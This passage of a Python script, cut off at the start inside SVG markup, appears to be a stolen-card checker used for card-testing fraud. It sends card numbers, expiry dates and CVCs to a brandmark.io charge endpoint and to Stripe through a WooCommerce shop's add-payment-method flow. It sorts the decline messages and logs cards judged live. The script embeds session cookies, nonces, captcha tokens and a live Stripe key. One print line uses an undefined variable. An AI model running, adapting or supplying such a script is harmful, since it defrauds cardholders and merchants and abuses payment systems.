translate(-625.83436 23.976)"> <path class="c1" d="M110.2768,116.33744l0.01115-0.0117l-4.86289-4.8629l-10.29436,10.31683l4.98342,4.98341 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19203-2.94234,7.95712-6.57175 C112.47179,119.50826,111.75554,117.52149,110.2768,116.33744z" transform="translate(537.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#0050ff" stroke="#0050ff"></path> <path class="c2" d="M104.85191,110.91254l0.01115-0.0117l-4.86289-4.86289L89.7058,116.35477l4.98342,4.98342 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19202-2.94235,7.95711-6.57175 C107.04688,114.08336,106.33064,112.09659,104.85191,110.91254z" transform="translate(537.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#2850a7" stroke="#2850a7"></path> <path class="c3" d="M101.14689,110.91162c0.76507-3.62949-1.55701-6.57178-5.18651-6.57178 c-3.62949,0-7.19199,2.94229-7.95707,6.57178c-0.76507,3.6295,1.55701,6.57179,5.18651,6.57179 S100.38182,114.54112,101.14689,110.91162z" transform="translate(537.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#515050" stroke="#515050"></path> </g>\n        <g id="path179464" aria-label="." transform="translate(0 318.29571999999996) translate(612.2931290899996 57.43256) scale(0.69) translate(-657.33436 23.976)"> <path class="c1" d="M110.2768,116.33744l0.01115-0.0117l-4.86289-4.8629l-10.29436,10.31683l4.98342,4.98341 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19203-2.94234,7.95712-6.57175 C112.47179,119.50826,111.75554,117.52149,110.2768,116.33744z" transform="translate(569.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#0050ff" stroke="#0050ff"></path> <path class="c2" d="M104.85191,110.91254l0.01115-0.0117l-4.86289-4.86289L89.7058,116.35477l4.98342,4.98342 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19202-2.94235,7.95711-6.57175 C107.04688,114.08336,106.33064,112.09659,104.85191,110.91254z" transform="translate(569.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#2850a7" stroke="#2850a7"></path> <path class="c3" d="M101.14689,110.91162c0.76507-3.62949-1.55701-6.57178-5.18651-6.57178 c-3.62949,0-7.19199,2.94229-7.95707,6.57178c-0.76507,3.6295,1.55701,6.57179,5.18651,6.57179 S100.38182,114.54112,101.14689,110.91162z" transform="translate(569.476834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#515050" stroke="#515050"></path> </g>\n        <g id="path179466" aria-label="." transform="translate(0 318.29571999999996) translate(634.0281290899995 57.43256) scale(0.69) translate(-688.83436 23.976)"> <path class="c1" d="M110.2768,116.33744l0.01115-0.0117l-4.86289-4.8629l-10.29436,10.31683l4.98342,4.98341 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19203-2.94234,7.95712-6.57175 C112.47179,119.50826,111.75554,117.52149,110.2768,116.33744z" transform="translate(600.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#0050ff" stroke="#0050ff"></path> <path class="c2" d="M104.85191,110.91254l0.01115-0.0117l-4.86289-4.86289L89.7058,116.35477l4.98342,4.98342 c0.0426,0.04426,0.08582,0.08752,0.13013,0.13013l0.00784,0.00784l0.00044-0.00055 c0.93417,0.89465,2.24017,1.43271,3.78723,1.43271c3.62951,0,7.19202-2.94235,7.95711-6.57175 C107.04688,114.08336,106.33064,112.09659,104.85191,110.91254z" transform="translate(600.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#2850a7" stroke="#2850a7"></path> <path class="c3" d="M101.14689,110.91162c0.76507-3.62949-1.55701-6.57178-5.18651-6.57178 c-3.62949,0-7.19199,2.94229-7.95707,6.57178c-0.76507,3.6295,1.55701,6.57179,5.18651,6.57179 S100.38182,114.54112,101.14689,110.91162z" transform="translate(600.976834 -128.31584)" stroke-width="0" stroke-linejoin="miter" stroke-miterlimit="2" fill="#515050" stroke="#515050"></path> </g>\n                   </g>\n      <image xlink:href="" id="icon" x="0" y="0" style="display: none;"></image>\n    </g>\n  </g>\n</svg>\n',
	    'recaptcha_token': '03AFcWeA6VYeBsPV2pZncCQ33ldSaHFXzv_4jagrxcvgNiBa86z9JLPjEiVWtnphVsChKYLrhUbCbktPN9g9_ZkGPozN6iL0JHlHCKKzg2enWJ0OUZD6uL_D6bxD4Uvrkd2P9igN4EOJNelT88_dJbv-_sItuzJKYsOmwvlc2AA1kXtchIkT0f7RiZXCVx7n5taPpcI2N_QycG8MQD35zuxxJlmwBPgx3fmY7XVs3iWJjS8ZwB3uWLXrY9mqEINeQbT_t5fOtKgv3aqpNkM3eKegZMLmK5H9zBvgoJ1J6HgWLxr2b2aWsxi___cuVdEQg1E6LMIAEZy8vrtsHufvob-n9vDzot0bdpRqp70SD8tVuARYOfJniKTKYzEHN9SmkEZReDdn8E78W_4Cwsw_RuKO6mWFJuSRlLWl2sZ75hK8UxDv7Li5dhM8Jk8boQshKgnBWUfJcPCc6BxvYEnp0npiK8xSpj9qDzqvUSBu6RHw1gtiAF3OMNTBXxxBNuJOMuDmuvvEv0JU_UvQEXoLHR7zN9eageDUGpDZmauKxhgImfjL90AyT-4uTx41WGZT-ZvRxyIUto8CVHTy_UK3xILy3KVe5neMB7FqAi2RKRbn5GgPwLg1BP5EstLafmPPbu9ro6lu8BVaVzlp3mlEL8PzLykEWT0XdPHAbZ2AJ9ULtLwsFhSQixId-UilI3XEbF5YqPC8eLF0mgXQKzCz-p10jKFGcGOHhLJjODC-dRLmSfvZcggBAn8XEnT9fMLnhv65rpDGKKeCst8-Ifp6-t8zq9XT-1nSLPZNM-bMNNgS4AzhPKQ_2H4HSnuj_E2vpYEa3wBBIvZ0y7l5OhN8tJg17NMTrADQhuoBtJinDu9OHE_EfJUz_t2oOsH5kXk9Lc4NvisXVl4R_Xh393juXpC_ARiqnnKbVYpJ3sKDGTNvhJ_4sr2rwF8eS8pWiGu2xOHKoi-LUc03k_1xelLefaLi58NOIvdO308m6xBXRjRDEWMx_KGgNduSnr6bw_Ks7R1GzBmRhPORJTFQAE7pMZOk7Np7PGmsS8HtwnMJicgpmdhvrohQgypevQ4hDiutEJXSI_5LRR12xIVTRUuv2UhFIuvBUrauLM7xom96d2p2RmCO0uzq7nUoDO5kYJaDMX4uNNTFKeWYUowvdmuziodFHP0jJ2lX5wOHtTZVyqSlrht7y9r7j9t2N0zT1oyk03QgfZLO0zwobLe0jj7LrAMsC98d6yjrwqHnsSD4WjDziZdVkacbw7MNIVdb_lyF3-uXPfnj3i_Lb1tAVfl8lQzr-TrDvE3oMzhOK3V-95E2lqdn_j5XIHotjghYfERszJsQlQ8C_nMjnJlu7pu8VMjKaerePVaG4IY2RgZmtcZL6geqfD16AHec_POWJV2BY6PryoyZ25ZsuJeihxIO5H5i1e8i0lhwGvp4hd0-5eSVM7OCZAW7_hhPbxnfcoUHqhl0G9Yv_yplCFNxqvZmrdILiTa5Kby7tc3cRO7Dg9Z7Ackx24-D7DyCQQvwa8J-5HnKpE-8-S4JZj2B4CyVFt6_m_310ia4bDxcSqalPIZbyAiN1AK3vYpKtTkWv-NOGLfqD2OTDCL0UgVvNOxFZbaNN502dUSlObEY911_gPYcuJiAD1YzvDZ-JgikFXRM3IEDoRTSCNvvO4leyPLDjWcpVwNJygQEz6Uj79gkSWPjC3LaT71KQrhO8nm5K8XaoPG-hfR2b5FfFUnL39RJnyfkSJjAab-SZazmTpy3IFAjSJRH5fd2HfaRk',
	    'token': '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',
	}
	
	response = requests.post('https://app.brandmark.io/v3/charge.php', cookies=cookies, headers=headers, json=json_data)
	
	re = response.text
	
	if 'Declined - Call Issuer' in re:
		print(H,nm,P,'Declined - Call Issuer ❌')
		
	elif 'Limit Exceeded' in re:
		print(H,nm,P,'Limit Exceeded ❌')
		
	elif 'No Such Issuer' in re:
		print(H,nm,P,'No Such Issuer ❌')
		
	elif 'Expired Card' in re:
		print(H,nm,P,'Expired Card ❌')

	elif 'Issuer or Cardholder has put a restriction on the card' in re:
		print(H,nm,P,'Issuer or Cardholder has put a restriction on the card ❌')
			
	elif 'No Account' in re:
		print(H,nm,P,'No Account ❌')
		
	elif 'Card Not Activated' in re:
		print(H,nm,P,'Card Not Activated ❌')
		
	elif 'Closed Card' in re:
		print(H,nm,P,'Closed Card ❌')

	elif 'Card Issuer Declined CVV' in re:
		print(H,nm,P,'Card Issuer Declined CVV ❌')
		
	elif 'Transaction Not Allowed' in re:
		print(H,nm,P,'Transaction Not Allowed ❌')
		
	elif 'Do Not Honor' in re:
		print(H,nm,P,'Do Not Honor ❌')
		
	elif 'Call Issuer. Pick Up Card' in re:
		print(H,nm,P,'Call Issuer. Pick Up Card ❌')
		
	elif 'Invalid Transaction' in re:
		print(H,nm,P,'Invalid Transaction ❌')

	elif 'Processor Declined' in re:
		print(H,nm,P,'Processor Declined ❌')
		
	elif 'risk_threshold' in re:
		print(H,nm,P,'risk_threshold ❌')
		
	elif 'Cannot Authorize at this time (Policy)' in re:
		print(H,nm,P,'Cannot Authorize at this time (Policy) ❌')
		
	elif 'Security Violation' in re:
		print(H,nm,P,'Security Violation ❌')
		
	elif 'Checkout/Receipt?OrderNumber' in re:
		print(H,nm,P,'Checkout/Receipt?OrderNumber ❌')
		
	elif 'Insufficient Funds' in re:
		print(B,nm,P,'Insufficient Funds ❎')
		with open('no mony.txt', 'a') as x:
			x.write(P+'\n')

	elif "The card number entered is invalid, or it does not match the selected card type" in re:

		with open('no card.txt', 'a') as x:
			x.write(P+'\n'+'\n'+re+'\n')
			
	else:
		with open('else.txt', 'a') as x:
			x.write(P+'\n'+re+'\n')
		
        
from colorama import Fore
def Medo(ccx):
	ccx=ccx.strip()
	cc = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=+&billing_details[email]=aahsiehdigei815%40li.me&card[number]={cc}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=476fadb6-4ca3-4a72-be47-5c2da0b69683f703a5&muid=df8d5b0e-1377-4d18-aa73-34155a30b778745312&sid=29b2ec14-129b-4bcf-b56c-66b2b54ca3a58fb5a6&payment_user_agent=stripe.js%2Ff01cf920a3%3B+stripe-js-v3%2Ff01cf920a3%3B+split-card-element&referrer=https%3A%2F%2Fwww.thonk.co.uk&time_on_page=85619&key=pk_live_VWRYPEVH9pBGaepBeXg0Ok0x00jrcIdpr2&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZr3c0r8hbIK571yAwwTpTYJTzMdYwT51o0FVYm3dH-XozYbKg6LKpTy-cwO34iXXLD4Vbe8oCCMddz-wItRme4dB_DTc1OFVwwCQINVFwQXM5XknfHwefoDg0GYIiLCrlgnPfQc5lRpielY7OjHEEOSsfBJikCO0WNSpZmbPAeDOCniPGvAYzAS1lVaEwLWEZOSjmtDIhO03KIkim7eYZmsCIAW06UIRCVe8RUCoA2lpqtmyACxh7wzlqWyxmme3hUrjeaf8w31fD91GJ71IWGo6mk7BglIsESXirxdV4xPho8YwrhkENupqkKvy8jG_53dc7nLcTr3eSxYIJcoMqynYz68Zs3RNtI_GCHKJmAgmXqLKl-2MDSQ9f6vyWK-z5nzMqIZprQQt7oGqUe0Z903adOo8HiEyYyeCM38EepB1PnhEOqedoDiENt4-5WEh-uQf6oB6J5mMr-X6AVZOzl4HaaQL0PWvYSf-WOV0sQ7oafwW7VetCDSWriBNqcrk0yFN8RM3SXK0z3qhVQhbJHwn5-eh3o0qcAlhkaYifSAewSnR9k4u8spq0bPm1QUsyk3RyCvW1M23Vndmhm_631QcD1OD0vZAi-B6M2QFuPFzVuKZZ2wVPmeG5k9fH30GwZRLIxXEOyxQcJ6PRAGamhE1UVgTBwLKxpyIJKf8Vu7Y8UThLVU-68F3xq-chj7pkqMMFOepMsQAtW0B6Q-l_py_9NQ2m0YJoGrYorZaSnN-ad5soSiq_pUPvDrcLmEA9woUPYSZNFF3juLHFOD-M6pEb17IxkvqL0gIGQ7yg08UGX4OncOqPEqah4Xtj1DfOid3Xokw5_sF4OgA__NcN3HaQgGYl6WF-oE0WUELClPwe762DGyphYr_LbnINLywWOpcgUaVf9D5Sz1olqGirGrThvInnvI_8tsK-yCttG7BmFI6RQBO_Tu_H6vPh2a1tdGEbjTF57uEiJ-OyV8kVNnYg6EHIP6WmLe7mtwxr5AmbzKRoglGiEF2wWC6rLFv9-jJGI3QajbXxxj3ztGShiQqXCwQP6IWyRAOJ5P1lgS0TdYR2fFfWJP8fwPh87z0EPquvchaBf0DtWVVegaKP8KZP5HZrt9cDVVKTcds5wyWjq27ZGhK3QgtXLwIG3KJsP8v4BImBpbNxn7YwXBAnJLSVHII5339BXYSU_w9M48sPPPAHATqfykNtipgpLioWHRfLVCqxPe3_Lxz5eGkz2P1c7JTvFspNBo4Sj55HBa6F7Vl3UNhISHoNaW69hErZ5YDs1uRtNxkvQSrrCI2dw-hlEtebwhCPhOlXzDWn0AGuv5EaxQ-LN-sEtgyJ51z_5YGvMJna9jAgeO4rT-6v5nqgBczGSDX-48pMarTbEzcm-MYP0hLNbWG09WN3Vgz4xASqIg2Zm_LLZx5hfB1vdOavd0tzZdrWGpo8oLYrkw6-rO7DkhjkT2nTYJH3ykHBF9Ps0DlNmToT-8vQf8WoowQIbJl4_WPt13iIvqfUXNV_v90fd6EHEkJC1_xjCXrI6tQCwCGOfWPQYCbuw1HTJAIlYjdFLfq19INr6rwAQ0yavDSe4RE6YXpslEm31OOUIDIaZYt877Cai9qBLaYN5K79fue0IGm6w6q58o9r_gPn1ixRKUR6t_BHmHIerKDstos6MY_iJx3RhTlhxcNhwGQreU_t3zN_Qigzk1UCBXU8nB_NRZy8dOztWLDunORiLpdCes3nIcBiiF6pWbd82B5XE2ZuIbWvJDhpHupCLpi74Q4OiZRsN8qx-NY-6OB4RLj4zxqUk2jOA-5NEiQvhZfpHtT5wGjPylf1iCE4a8lCAV5woQZhs2yutVp7cq18H3S4Km3nKD2dKLE5ZHNcDIl6vHwzz3LWvCj43WvELzw22pjfx7mblzHGf37261eKwbrkZVUnBy3l5bFzr3fL0UdCOG1salMphY4CS3SJPP4CpwFS3NZ40IdHYvK2SztVCLaJ6j4sTx0by9F7OhQB0I5k8LlvN52VFx4UgU_pXhMHknPwiw65BVhqSjNrkVOsLjeZ3vjFYzO1d8MnkGfFP8pi_dqtp_o36cp2dG2ksdSsPScvRPG-nkSDHJtvALp5791oZuBmHnyX_g8-7jddHbu27G2HCIz3EQ6sT1X3QMf6bbAzv5IRBDiQYWRROs8xEiBmfF3EmURHck6ijZXhwzmab7kCoc2hhcmRfaWTOFDyEH6JrcqgxZjgzMGY2NaJwZAA.hYM6rQHHeDyqEE-KwNdjbMYoqhrhQvNYQUvhKqf1DVg'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		innd=response.json()['id']
	except:
		pass
		
	cookies = {
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-07-20%2016%3A56%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thonk.co.uk%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_first_add': 'fd%3D2024-07-20%2016%3A56%3A31%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thonk.co.uk%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
	    '_fbp': 'fb.2.1721494593186.786666370757863311',
	    'woocommerce_current_currency': 'GBP',
	    'mailchimp_landing_site': 'https%3A%2F%2Fwww.thonk.co.uk%2Fmy-account%2F',
	    'mailchimp.cart.current_email': 'aahsiehdigei815@li.me',
	    'mailchimp_user_email': 'aahsiehdigei815%40li.me',
	    'wordpress_logged_in_f9aab48a6c2081ab1ed041c553ba2d31': 'aahsiehdigei815%7C1722704213%7Ci89XlrT0SBrrwcmoLYHNxlexXZejbB5QTy2ygCVe67M%7C7be38e4f43c4efe66c1b4feb6ffe003e97552871a17880ccf0dce3de8b9c0ce2',
	    '__stripe_mid': 'df8d5b0e-1377-4d18-aa73-34155a30b778745312',
	    '__stripe_sid': '29b2ec14-129b-4bcf-b56c-66b2b54ca3a58fb5a6',
	    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thonk.co.uk%2Fmy-account%2Fadd-payment-method%2F',
	}
	
	headers = {
	    'authority': 'www.thonk.co.uk',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.thonk.co.uk',
	    'referer': 'https://www.thonk.co.uk/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': innd,
	    'nonce': '3e1a558ceb',
	}
	
	response = requests.post('https://www.thonk.co.uk/', params=params, cookies=cookies, headers=headers, data=data)
	msg=response.text
	if 'success' in msg:
		print(Fore.GREEN+f"{cc}|{mm}|{yy}|{cvc}>> APPROVED ✅")
	else:
		print(Fore.RED+f"{card} >> DECLIND ❌")
	   
	   

